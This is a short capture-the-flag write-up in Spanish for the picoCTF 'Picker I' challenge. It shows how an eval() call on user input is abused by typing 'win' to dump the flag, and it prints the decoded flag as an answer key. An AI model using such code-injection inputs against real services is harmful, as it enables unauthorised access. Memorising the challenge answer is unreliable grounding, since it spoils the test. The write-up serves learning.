## Descripción 
This service can provide you with a random number, but can it do anything else? Connect to the program with netcat: `$ nc saturn.picoctf.net 52436` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/514/picker-I.py).
## Solución
- nos conectamos y pide que mtamos un numero random
- se nosdio un .py, lo revisamos y buscamos que hay de raro
- vemos que esta usando la funcion eval(), que todo lo que recibe, expande su significado, asi que en este caso pedimos la variable win
```
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d 
Try entering "getRandomNumber" without the double quotes...

```

- se lo pasamos a una IA para que haga el decode y da 
  
  ```
  picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}
  ```
## Notas adicionales

# Referencias
